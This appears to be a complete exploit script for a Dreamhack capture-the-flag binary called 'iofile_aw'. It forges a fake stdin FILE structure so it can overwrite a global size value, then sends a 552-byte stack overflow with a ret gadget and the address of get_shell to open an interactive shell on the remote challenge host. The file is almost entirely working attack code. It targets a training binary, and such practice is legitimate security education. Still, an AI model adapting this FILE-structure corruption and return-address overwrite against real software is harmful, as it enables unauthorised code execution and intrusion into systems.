#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./iofile_aw_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc-2.23.so")
ld = ptr.ELF("./ld-2.23.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 23546)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    size = unwrap(exe.symbol("size"))
    payload = ptr.p64(0xFBAD2488)
    payload += ptr.p64(0)  # _IO_read_ptr
    payload += ptr.p64(0)  # _IO_read_end
    payload += ptr.p64(0)  # _IO_read_base
    payload += ptr.p64(0)  # _IO_write_base
    payload += ptr.p64(0)  # _IO_write_ptr
    payload += ptr.p64(0)  # _IO_write_end
    payload += ptr.p64(size)  # _IO_buf_base
    payload += ptr.p64(size + 1024)  # _IO_buf_end
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(0)
    payload += ptr.p64(0)  # stdin

    io.sendlineafter(b"# ", b"printf " + payload)
    io.sendlineafter(b"# ", b"read")
    io.sendline(ptr.p64(0x1000))

    payload = b""
    payload += b"A" * 552
    payload += ptr.p64(next(exe.gadget("ret;")))
    payload += ptr.p64(unwrap(exe.symbol("get_shell")))

    io.sendlineafter(b"#", payload)
    io.sendlineafter(b"# ", b"exit")

    io.interactive()
    return


if __name__ == "__main__":
    main()
